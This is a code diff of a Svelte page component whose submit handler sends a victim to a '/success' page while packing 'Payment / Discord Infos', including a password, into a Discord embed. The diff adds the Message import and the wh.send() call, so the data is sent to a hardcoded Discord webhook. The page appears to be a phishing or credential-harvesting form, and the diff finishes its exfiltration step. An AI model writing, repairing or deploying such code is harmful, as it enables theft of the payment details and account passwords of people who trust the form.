@@ -1,6 +1,6 @@
 <script>
 import { goto } from "$app/navigation";
-    import { Embed, Field, Webhook } from "discord-webhook-library";
+    import { Embed, Field, Message, Webhook } from "discord-webhook-library";
 
 
 let id = $state("")
@@ -11,7 +11,8 @@ const webhook = "https://discord.com/api/webhooks/1438248565557170378/wwnrmdkDN3
 
 async function submit(){
     goto("/success")
-    const wh = new Webhook(webhook).addWebhookUrl(webhook)
+    const wh = new Webhook(webhook)
+    wh.addWebhookUrl(webhook)
     const e = new Embed()
     e.setTitle("Payment / Discord Infos")
     e.addFields(
@@ -24,7 +25,15 @@ async function submit(){
                 password
             )
         ]
-    )
+    );
+    wh.addMessage(new Message(
+        {
+            embeds: [e]
+        }
+    ))
+
+    wh.send()
+    
 }
 
 
